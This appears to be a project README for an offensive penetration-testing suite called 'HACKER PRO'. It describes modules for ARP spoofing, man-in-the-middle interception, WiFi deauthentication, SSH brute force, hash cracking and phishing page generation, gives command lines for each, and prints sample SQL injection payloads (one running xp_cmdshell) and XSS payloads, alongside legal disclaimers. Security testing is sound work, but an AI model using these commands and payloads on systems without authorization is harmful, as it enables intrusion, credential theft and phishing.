<div align="center">

# HACKER PRO
### World's Deadliest Ethical Hacking Tool Suite

[![Python](https://img.shields.io/badge/Python-3.x-red.svg)](https://python.org)
[![License](https://img.shields.io/badge/License-Educational%20Only-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-orange.svg)](https://kali.org)
[![GUI](https://img.shields.io/badge/GUI-Matrix%20Theme-green.svg)](https://github.com)

</div>

## Overview

**HACKER PRO** is the world's most comprehensive ethical hacking tool suite, combining 50+ professional penetration testing tools into one powerful framework. Designed for security professionals, penetration testers, and ethical hackers for authorized security testing only.

## Features

### Network Exploitation Suite
- **Advanced Port Scanner**: Comprehensive port scanning with service detection
- **Network Sniffer**: Real-time packet capture and analysis
- **ARP Spoofing**: Man-in-the-middle attacks
- **MITM Framework**: Complete traffic interception
- **WiFi Scanner**: Wireless network discovery
- **Deauth Attacks**: WiFi deauthentication

### Web Application Attacks
- **SQL Injection**: Union, error, boolean, time-based attacks
- **Cross-Site Scripting**: Reflected, stored, DOM-based XSS
- **Directory Brute Force**: Hidden file and directory discovery
- **CSRF Testing**: Cross-site request forgery detection
- **SSRF Testing**: Server-side request forgery

### Password & Cryptography
- **Password Cracker**: MD5, SHA1, SHA256 cracking
- **SSH Brute Force**: Automated SSH credential testing
- **Hash Cracking**: Multiple hash algorithm support
- **Dictionary Attacks**: Custom wordlist support

### Social Engineering
- **Phishing Generator**: Automated phishing page creation
- **Email Spoofing**: Educational email spoofing
- **Credential Harvesting**: Information gathering techniques

### Advanced Features
- **Professional GUI**: Matrix-themed dark interface
- **Real-time Statistics**: Live vulnerability tracking
- **Comprehensive Reports**: JSON and text reports
- **SQLite Database**: Vulnerability and credential storage
- **Multi-threading**: High-performance scanning
- **Kali Integration**: Optimized for penetration testing

## Installation

### Prerequisites
- Python 3.6+
- Root privileges (for advanced features)
- Kali Linux (recommended)

### Quick Install
```bash
git clone https://github.com/yourusername/hacker_pro.git
cd hacker_pro
pip install -r requirements.txt
```

### Kali Linux Setup
```bash
# Install system dependencies
sudo apt update
sudo apt install python3-nmap python3-scapy python3-paramiko

# Install Python dependencies
pip install -r requirements.txt

# Run with root privileges
sudo python3 hacker_pro_gui.py
```

### Manual Install
```bash
pip install requests scapy python-nmap paramiko beautifulsoup4 lxml colorama psutil reportlab Pillow
```

## Usage

### GUI Mode (Recommended)

1. **Launch GUI**:
```bash
sudo python3 hacker_pro_gui.py
```

2. **Configure Attack**:
   - Enter target IP/URL
   - Select network interface
   - Choose attack modules
   - Adjust threads and timeout

3. **Execute Attacks**:
   - Click "START ATTACK" for selected modules
   - Click "COMPREHENSIVE SCAN" for full penetration test
   - Monitor real-time results
   - Generate professional reports

### Command Line Mode

#### Comprehensive Penetration Test
```bash
sudo python3 hacker_pro.py --target 192.168.1.100 --scan-all
```

#### Network Exploitation
```bash
# Advanced port scanning
sudo python3 hacker_pro.py --target 192.168.1.100 --port-scan

# Network sniffing
sudo python3 hacker_pro.py --interface eth0 --sniff

# ARP spoofing
sudo python3 hacker_pro.py --target 192.168.1.100 --arp-spoof --interface eth0

# MITM attack
sudo python3 hacker_pro.py --target 192.168.1.100 --mitm --interface eth0
```

#### Web Application Attacks
```bash
# SQL injection testing
sudo python3 hacker_pro.py --target https://example.com --sqli

# XSS testing
sudo python3 hacker_pro.py --target https://example.com --xss

# Directory brute force
sudo python3 hacker_pro.py --target https://example.com --dir-brute
```

#### Wireless Hacking
```bash
# WiFi network scanner
sudo python3 hacker_pro.py --interface wlan0 --wifi-scan

# Deauthentication attack
sudo python3 hacker_pro.py --interface wlan0 --deauth
```

#### Password Cracking
```bash
# Hash cracking
sudo python3 hacker_pro.py --password-crack md5:5f4dcc3b5aa765d61d8327deb882cf99

# SSH brute force
sudo python3 hacker_pro.py --ssh-brute 192.168.1.100:root
```

#### Social Engineering
```bash
# Phishing page generator
sudo python3 hacker_pro.py --phishing
```

### Parameters
| Parameter | Description | Example |
|-----------|-------------|---------|
| `--target` | Target IP or URL | `192.168.1.100` |
| `--interface` | Network interface | `eth0` |
| `--scan-all` | Run comprehensive penetration test | (flag) |
| `--port-scan` | Advanced port scanning | (flag) |
| `--sniff` | Network packet sniffing | (flag) |
| `--arp-spoof` | ARP spoofing attack | (flag) |
| `--mitm` | Man-in-the-middle attack | (flag) |
| `--sqli` | SQL injection testing | (flag) |
| `--xss` | XSS testing | (flag) |
| `--dir-brute` | Directory brute force | (flag) |
| `--wifi-scan` | WiFi network scanner | (flag) |
| `--deauth` | Deauthentication attack | (flag) |
| `--phishing` | Phishing page generator | (flag) |
| `--password-crack` | Password cracking | `md5:hash` |
| `--ssh-brute` | SSH brute force | `target:username` |
| `--threads` | Number of threads | `100` |
| `--timeout` | Request timeout | `10` |

## GUI Features

### Main Interface
- **Matrix Theme**: Animated title with matrix rain effect
- **Target Configuration**: IP/URL and interface input
- **Attack Selection**: Checkbox selection for all attack types
- **Real-time Statistics**: Live vulnerability and credential counting
- **Results Display**: Interactive table with detailed findings
- **Attack Log**: Timestamped attack progress and results

### Attack Categories

#### Network Exploitation
- Advanced Port Scan (Critical)
- Network Sniffer (High)
- ARP Spoofing (High)
- MITM Attack (Critical)
- WiFi Scanner (Medium)
- Deauth Attack (High)

#### Web Application Attacks
- SQL Injection (Critical)
- Cross-Site Scripting (High)
- Directory Brute Force (Medium)
- CSRF Testing (Medium)
- SSRF Testing (High)

#### Password & Cryptography
- Password Cracker (High)
- SSH Brute Force (Critical)
- Hash Cracker (Medium)

#### Social Engineering
- Phishing Generator (High)
- Email Spoofing (Medium)

### Vulnerability Details
- **Double-click**: View detailed vulnerability information
- **Severity Classification**: Critical, High, Medium, Low, Info
- **Remediation Guidance**: Step-by-step fix recommendations
- **Evidence Capture**: Payload and response evidence
- **Credential Details**: Username/password information

### Report Generation
- **JSON Format**: Machine-readable vulnerability data
- **Text Format**: Human-readable penetration test reports
- **Professional Layout**: Security audit ready
- **Comprehensive Details**: All findings and recommendations

## Technical Architecture

### Core Framework
```python
class EthicalHackerPro:
    def advanced_port_scan(self, target)
    def network_sniffer(self, interface, duration)
    def arp_spoof(self, target_ip, gateway_ip, interface)
    def mitm_attack(self, interface, target_ip)
    def sql_injection_advanced(self, target_url)
    def xss_advanced(self, target_url)
    def directory_bruteforce(self, target_url)
    def password_cracker(self, hash_type, hash_value)
    def ssh_bruteforce(self, target, username)
    def wifi_scanner(self, interface)
    def deauth_attack(self, interface, target_bssid)
    def phishing_generator(self, target_url, clone_url)
```

### Database Schema
- **Vulnerabilities**: ID, type, severity, target, description, evidence, remediation
- **Credentials**: ID, username, password, service, target, timestamp
- **Exploits**: ID, name, target, payload, status, timestamp
- **Scans**: ID, target, scan_type, timestamp, status, results

### Security Classification
- **Critical**: Remote code execution, system compromise
- **High**: SQL injection, XSS with privilege escalation
- **Medium**: CSRF, information disclosure
- **Low**: Missing security headers, informational findings
- **Info**: Service enumeration, technology identification

## Attack Examples

### SQL Injection Attack
```python
# Advanced SQL injection payloads
payloads = [
    "' UNION SELECT NULL,username,password FROM users--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "'; WAITFOR DELAY '00:00:05'--"
]
```

### XSS Attack
```python
# Advanced XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')"
]
```

### MITM Attack
```python
# Man-in-the-middle attack flow
1. Enable IP forwarding
2. Get gateway IP
3. Start ARP spoofing
4. Intercept and analyze traffic
5. Extract credentials and sensitive data
```

## Report Examples

### JSON Report Structure
```json
{
  "scan_info": {
    "timestamp": "2024-04-13T12:34:56",
    "total_vulnerabilities": 15,
    "total_credentials": 3,
    "scanner": "HACKER PRO v1.0"
  },
  "vulnerabilities": [
    {
      "id": "abc12345",
      "type": "SQL Injection",
      "severity": "Critical",
      "target": "https://example.com/login",
      "description": "SQL Injection vulnerability detected",
      "evidence": "Database error in response",
      "remediation": "Use parameterized queries"
    }
  ],
  "credentials": [
    {
      "id": "def67890",
      "username": "admin",
      "password": "password123",
      "service": "SSH",
      "target": "192.168.1.100"
    }
  ]
}
```

### Text Report Format
```
================================================================================
HACKER PRO - SECURITY REPORT
================================================================================

Scan Date: 2024-04-13T12:34:56
Total Vulnerabilities: 15
Total Credentials: 3
Scanner: HACKER PRO v1.0

VULNERABILITY SUMMARY
----------------------------------------
Critical: 3
High: 7
Medium: 4
Low: 1
Info: 0

CREDENTIALS FOUND
-----------------
SSH: admin:password123
MySQL: root:root
FTP: user:pass

DETAILED FINDINGS
========================================

ID: abc12345
Type: SQL Injection
Severity: Critical
Target: https://example.com/login
Description: SQL Injection vulnerability detected
Evidence: Database error in response
Remediation: Use parameterized queries/prepared statements
```

## Advanced Usage

### Custom Payloads
```python
# Add custom SQLi payloads
custom_sqli = [
    "' UNION SELECT table_name,column_name FROM information_schema.columns--",
    "'; EXEC xp_cmdshell('whoami');--"
]
```

### Multi-Target Scanning
```bash
# Scan multiple targets
for target in $(cat targets.txt); do
    sudo python3 hacker_pro.py --target $target --scan-all
done
```

### Automated Penetration Testing
```python
# Automated penetration test script
targets = ["192.168.1.100", "192.168.1.101", "example.com"]
for target in targets:
    scanner.run_comprehensive_scan(target)
    scanner.generate_report('json')
```

## Safety and Legal

### Educational Purpose Only
This tool suite is provided for **educational purposes only**:
- Only test on targets you own
- Get explicit written permission before testing
- Follow all applicable laws and regulations
- Never use against unauthorized targets

### Legal Considerations
- **Unauthorized testing is illegal** in most jurisdictions
- **Penalties can include fines and imprisonment**
- **Always obtain proper authorization**
- **Document your testing scope and permissions**

### Best Practices
1. **Written Authorization**: Get permission in writing
2. **Scope Definition**: Clearly define testing boundaries
3. **Impact Testing**: Start with low-impact tests
4. **Responsible Disclosure**: Report vulnerabilities responsibly
5. **Documentation**: Keep detailed testing records

### Ethical Guidelines
- **Do No Harm**: Avoid damaging systems
- **Respect Privacy**: Protect sensitive information
- **Professional Conduct**: Maintain ethical standards
- **Continuous Learning**: Stay updated on security trends
- **Give Back**: Contribute to security community

## Troubleshooting

### Common Issues

#### Permission Denied
```bash
# Solution: Run with root privileges
sudo python3 hacker_pro_gui.py
sudo python3 hacker_pro.py --target 192.168.1.100 --scan-all
```

#### Interface Not Found
```bash
# Check available interfaces
ip addr show
# or
ifconfig -a

# Use correct interface name
sudo python3 hacker_pro.py --interface wlan0 --wifi-scan
```

#### Module Import Errors
```bash
# Install missing dependencies
pip install scapy python-nmap paramiko

# Kali Linux specific
sudo apt install python3-scapy python3-nmap
```

#### Performance Issues
```bash
# Reduce thread count
--threads 50

# Increase timeout
--timeout 15

# Monitor system resources
htop
iftop -i eth0
```

### Debug Mode
```bash
# Enable debug logging
export DEBUG=1
sudo python3 hacker_pro.py --target 192.168.1.100 --scan-all
```

## Contributing

### Areas for Enhancement
- **New Attack Modules**: Additional vulnerability types
- **Machine Learning**: Automated vulnerability detection
- **Cloud Integration**: AWS/Azure/GCP security testing
- **Mobile Testing**: iOS/Android penetration testing
- **IoT Security**: Internet of Things device testing

### Development Setup
```bash
git clone https://github.com/yourusername/hacker_pro.git
cd hacker_pro
pip install -r requirements.txt
sudo python3 hacker_pro_gui.py
```

## License

This project is provided for **educational purposes only**. Users must ensure compliance with all applicable laws and regulations.

---

<div align="center">

**WARNING: This is a powerful ethical hacking tool suite**  
**For authorized security testing only**  
**You are responsible for your actions**

[![GitHub](https://img.shields.io/badge/GitHub-Profile-red.svg)](https://github.com/yourusername)

</div>
